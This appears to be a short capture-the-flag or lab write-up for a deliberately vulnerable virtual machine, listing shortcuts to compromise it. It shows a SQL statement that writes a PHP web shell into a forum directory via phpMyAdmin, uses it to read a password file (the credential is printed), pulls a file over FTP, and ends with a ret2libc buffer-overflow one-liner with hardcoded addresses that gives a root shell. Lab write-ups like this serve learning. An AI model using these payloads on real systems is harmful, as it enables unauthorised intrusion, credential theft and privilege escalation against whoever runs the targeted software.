# bonus1

We used quite a few tricks to get our life easier, which are going to be explained here.

## PHPMYADMIN

```sql
SELECT "<?php system($_GET['cmd']) ?>"
INTO OUTFILE "/var/www/forum/templates_c/com.php"
```

https://192.168.56.101/forum/templates_c/com.php?cmd=cat%20/home/LOOKATME/password
lmezard:G!@M6f4Eatau{sF"

## FTP LMEZARD

```bash
ftp 192.168.56.101
..
ftp> get fun
local: fun remote: fun
229 Entering Extended Passive Mode (|||26189|)
150 Opening BINARY mode data connection for fun (808960 bytes).
100% |***********************************************************************************|   790 KiB   63.37 MiB/s    00:00 ETA
226 Transfer complete.
808960 bytes received in 00:00 (62.55 MiB/s)
```

```
$ mv fun /tmp && cd /tmp && tar -xf fun && cd fun && for file in ./*
$ do
$ cat $file >> ../res
$ done
```

## ROOT RET2LIBC

```bash
$ ./exploit_me $(python -c 'print "a" * 140 + "\x60\xb0\xe6\xb7" + "aaaa" + "\x58\xcc\xf8\xb7"')
$ whoami
root
```
